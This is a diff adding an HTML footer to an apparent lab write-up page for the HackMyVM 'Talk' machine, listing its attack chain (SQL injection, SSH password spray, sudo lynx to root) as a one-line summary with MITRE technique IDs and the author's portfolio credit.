+<!-- ═══════════════════ FOOTER ═══════════════════ -->
+<footer style="background:var(--bg2);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text-muted);font-size:.82rem;">HackMyVM · Talk · Easy · Linux · nginx 1.14.2 + PHP · SQLi (T1190) + SSH spray (T1110.003) + sudo lynx (T1548.003) · 2026-04-11</p>
+  <p style="color:var(--text-muted);font-size:.78rem;margin-top:.35rem;">© <span style="color:var(--accent);">Yoandy Ramírez Delgado</span> · Offensive Security Portfolio · Cadena: SQLi → DB dump → SSH spray → sudo lynx → root</p>
+</footer>
+
+</body>
+</html>
